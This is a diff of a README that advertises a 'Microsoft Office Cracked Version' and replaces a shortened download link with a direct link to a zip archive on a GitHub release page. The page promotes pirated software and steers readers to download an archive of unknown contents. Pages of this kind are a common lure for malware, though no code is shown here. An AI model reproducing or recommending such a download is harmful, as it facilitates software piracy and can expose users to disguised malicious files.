@@ -1,6 +1,6 @@
 # 🚀 Microsoft Office Cracked Version 🚀
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=download)](https://bit.ly/4bpJ8LF)
+[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=download)](https://github.com/ChaGiNa7/Office365/releases/download/Download/office365.zip)
 
 ## 📜 Description
 
